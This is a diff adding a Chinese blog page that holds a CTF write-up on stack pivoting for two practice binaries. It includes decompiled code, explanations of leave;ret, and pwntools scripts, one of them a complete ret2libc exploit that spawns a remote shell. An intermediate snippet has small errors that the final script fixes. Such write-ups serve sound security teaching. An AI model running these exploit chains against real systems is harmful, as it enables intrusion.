@@ -1,0 +1,587 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    栈迁移利用方法分析 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="栈迁移利用方法分析参考资料：https:&#x2F;&#x2F;hetian.blog.csdn.net&#x2F;article&#x2F;details&#x2F;106561835 1）[Black Watch 入群题]PWN 1234567891011121314ssize_t vul_function()&#123;    size_t _Hello_good_Ctfer__nWhat_is_your_name?_; &#x2F;&#x2F; eax">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移利用方法分析">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="栈迁移利用方法分析参考资料：https:&#x2F;&#x2F;hetian.blog.csdn.net&#x2F;article&#x2F;details&#x2F;106561835 1）[Black Watch 入群题]PWN 1234567891011121314ssize_t vul_function()&#123;    size_t _Hello_good_Ctfer__nWhat_is_your_name?_; &#x2F;&#x2F; eax">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1772303512990-db34e4d2-83c0-4f8c-b70e-0c19f829bd94-128911.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1772306030621-4b4596ec-0d35-46a0-8d81-a8474547ddd7-119388.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1772306591359-3436db2e-ad97-4ae5-8451-662fa19afa7a-092807.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1773837474893-c56a2bb2-5510-4a6e-afeb-b619e0e95215-917574.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1773837530880-3a5e7165-9302-40a1-b720-7857d13967ff-773190.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1773840591864-19ec3eb5-3e59-4828-b50f-5b32294b68b7-682192.png">
+<meta property="article:published_time" content="2026-04-28T10:25:58.734Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.422Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/OjtIZ-5TIbD3ysuF/1772303512990-db34e4d2-83c0-4f8c-b70e-0c19f829bd94-128911.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="栈迁移利用方法分析">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">栈迁移利用方法分析</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">栈迁移利用方法分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN"><span class="toc-number">1.1.</span> <span class="toc-text">1）[Black Watch 入群题]PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89actf-2019-babystack-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.2.</span> <span class="toc-text">2）actf_2019_babystack(栈迁移)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#signal-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">signal() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#putchar-62"><span class="toc-number">1.2.2.</span> <span class="toc-text">putchar(62)</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/栈迁移/栈迁移利用方法分析" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:58.734Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="栈迁移利用方法分析"><a href="#栈迁移利用方法分析" class="headerlink" title="栈迁移利用方法分析"></a>栈迁移利用方法分析</h1><p>参考资料：<a target="_blank" rel="noopener" href="https://hetian.blog.csdn.net/article/details/106561835">https://hetian.blog.csdn.net/article/details/106561835</a></p>
+<h3 id="1）-Black-Watch-入群题-PWN"><a href="#1）-Black-Watch-入群题-PWN" class="headerlink" title="1）[Black Watch 入群题]PWN"></a>1）[Black Watch 入群题]PWN</h3><p><img src="/HFTTC.github.io/./img/OjtIZ-5TIbD3ysuF/1772303512990-db34e4d2-83c0-4f8c-b70e-0c19f829bd94-128911.png" alt="1772303512990-db34e4d2-83c0-4f8c-b70e-0c19f829bd94.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> _Hello_good_Ctfer__nWhat_is_your_name?_; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">size_t</span> _What_do_you_want_to_say?_; <span class="comment">// eax</span></span><br><span class="line">    _BYTE buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">    _Hello_good_Ctfer__nWhat_is_your_name?_ = <span class="built_in">strlen</span>(m1);<span class="comment">// &quot;Hello good Ctfer!\nWhat is your name?&quot;</span></span><br><span class="line">    write(<span class="number">1</span>, m1, _Hello_good_Ctfer__nWhat_is_your_name?_);<span class="comment">// &quot;Hello good Ctfer!\nWhat is your name?&quot;</span></span><br><span class="line">    read(<span class="number">0</span>, &amp;s, <span class="number">0x200u</span>);</span><br><span class="line">    _What_do_you_want_to_say?_ = <span class="built_in">strlen</span>(m2);      <span class="comment">// &quot;What do you want to say?&quot;</span></span><br><span class="line">    write(<span class="number">1</span>, m2, _What_do_you_want_to_say?_);     <span class="comment">// &quot;What do you want to say?&quot;</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个是本题的主要函数，基本程序还是很清楚的，第一个 read 函数可以读取 0x200 个字节的内容，</p>
+<p>&amp;s 在 bss 段上，第二个 read 函数可以读取 0x20 个字节的内容到 buf 当中。在函数当中并没有找到后门函数。</p>
+<p>那我们现在来总结一下我们需要解决的问题：</p>
+<ol>
+<li>&amp;s 写在 bss 段无法触发栈溢出，buf 可以出发栈溢出但是可读取字节太少，导致可溢出字节太少。</li>
+<li>没有找到后门函数，大概率需要利用延迟绑定，需要利用.got.plt 表寻找 libc</li>
+</ol>
+<p>那我们目前就确定了基本方案，在 bss 段上写 rop 链，利用栈迁移从第二次 read 的栈溢出出发 rop 链。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在第一次 read 以中传入 payload1 当做可用的 rop 链，之后需要利用第二次 read 构造栈迁移</p>
+<p>在此之前，先复习一下几个汇编指令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp   ;      <span class="comment">// 把栈指针esp指向ebp的位置（栈帧基址）</span></span><br><span class="line">pop ebp        ;      <span class="comment">// 把esp指向的内容弹出到ebp，esp自动+4</span></span><br><span class="line"><span class="comment">/*执行完leave之后,esp的栈地址变成了ebp+4的栈地址，ebp的栈地址变成了ebp栈地址中的数据*/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip        ;      <span class="comment">// 把esp指向的内容弹出到eip（程序执行地址），esp自动+4</span></span><br></pre></td></tr></table></figure>
+
+<p>利用 leave_ret 汇编指令我们可以构造以下 payload2，不过前题我们要知道偏移，运行到第二次 read 手测一下</p>
+<p><img src="/HFTTC.github.io/./img/OjtIZ-5TIbD3ysuF/1772306030621-4b4596ec-0d35-46a0-8d81-a8474547ddd7-119388.png" alt="1772306030621-4b4596ec-0d35-46a0-8d81-a8474547ddd7.png"></p>
+<p>28 - 4 &#x3D; 0x18， 之后就可以构造 payload2 了 -&gt;</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>               <span class="comment">// 填充到ebp的偏移</span></span><br><span class="line">payload2 += p32(bss_addr<span class="number">-4</span>)       <span class="comment">// 覆盖ebp寄存器的值</span></span><br><span class="line">payload2 += p32(leave_ret)        <span class="comment">// 覆盖返回地址为leave;ret指令的地址</span></span><br><span class="line"><span class="comment">/*执行完leave之后,esp的栈地址变成了ebp+4的栈地址，也就是bss段地址*/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/OjtIZ-5TIbD3ysuF/1772306591359-3436db2e-ad97-4ae5-8451-662fa19afa7a-092807.png" alt="1772306591359-3436db2e-ad97-4ae5-8451-662fa19afa7a.png"></p>
+<p>那么第一段 exp 大概就构造好了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29721</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn43&#x27;</span>)</span><br><span class="line">main_addr = <span class="number">0x8048513</span></span><br><span class="line">leave_ret = <span class="number">0x8048511</span></span><br><span class="line">bss_addr = <span class="number">0x804A300</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">18</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>相信剩下的 exp 就是基本的 ret2libc，应该不成问题，放一个总 exp 吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29410</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn43&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main=<span class="number">0x08048513</span></span><br><span class="line">bss_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;name?&quot;</span>)</span><br><span class="line">payload1=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;say?&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;name?&quot;</span>)</span><br><span class="line">payload3=p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;say?&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2）actf-2019-babystack-栈迁移"><a href="#2）actf-2019-babystack-栈迁移" class="headerlink" title="2）actf_2019_babystack(栈迁移)"></a>2）actf_2019_babystack(栈迁移)</h3><p><img src="/HFTTC.github.io/./img/OjtIZ-5TIbD3ysuF/1773837474893-c56a2bb2-5510-4a6e-afeb-b619e0e95215-917574.png" alt="1773837474893-c56a2bb2-5510-4a6e-afeb-b619e0e95215.png"></p>
+<p><img src="/HFTTC.github.io/./img/OjtIZ-5TIbD3ysuF/1773837530880-3a5e7165-9302-40a1-b720-7857d13967ff-773190.png" alt="1773837530880-3a5e7165-9302-40a1-b720-7857d13967ff.png"></p>
+<h4 id="signal-函数"><a href="#signal-函数" class="headerlink" title="signal() 函数"></a>signal() 函数</h4><p>在 C 语言（POSIX 标准）中，signal() 用来 <strong>设置一个信号的处理函数</strong>，函数原型是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;signal.h&gt;</span><br><span class="line"></span><br><span class="line">void (*signal(int signum, void (*handler)(int)))(int);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>signum</strong>：要捕捉的信号编号。</li>
+<li><strong>handler</strong>：指向一个函数的指针，当信号发生时调用该函数。<ul>
+<li>也可以用 SIG_IGN（忽略信号）或 SIG_DFL（默认处理方式）。</li>
+</ul>
+</li>
+</ul>
+<p>返回值是 <strong>原来的信号处理函数指针</strong>。</p>
+<ul>
+<li>signal(14, handler) 设置了一个自定义信号处理函数。</li>
+<li>信号 14 是 SIGALRM，用于定时器。</li>
+<li>信号发生时会执行 handler，而不是默认终止程序。</li>
+</ul>
+<h4 id="putchar-62"><a href="#putchar-62" class="headerlink" title="putchar(62)"></a>putchar(62)</h4><p>相当于 putchar(‘&gt;’);就是输出对应 ASCLL 码的字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400A1A()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 nbytes; // rax</span><br><span class="line">  char s[<span class="number">16</span>]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">8</span>, stdin);</span><br><span class="line">  nbytes = atol(s);</span><br><span class="line">  ::nbytes = nbytes</span><br><span class="line">  <span class="keyword">return</span> nbytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>先确定 bytes 大小，这里我们确定选择最大值 0xE0</li>
+</ol>
+<p>我们发现 0xE0 虽然可以溢出，不过最多也就是覆盖 rbp 和返回地址了，所以确定这是一道栈迁移的题目。</p>
+<p>另外，我们注意到：bytes 是写在 .bss 段上的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29607</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">main_addr= <span class="number">0x4008f6</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x400709</span></span><br><span class="line">pop_rdi = <span class="number">0x400ad3</span></span><br><span class="line">leave_ret = <span class="number">0x400a18</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">224</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
+
+<p>drop&#x3D;True 表示 <strong>返回的字符串里不包含分隔符本身</strong>，也就是不包含 \n</p>
+<ol start="2">
+<li>栈迁移</li>
+</ol>
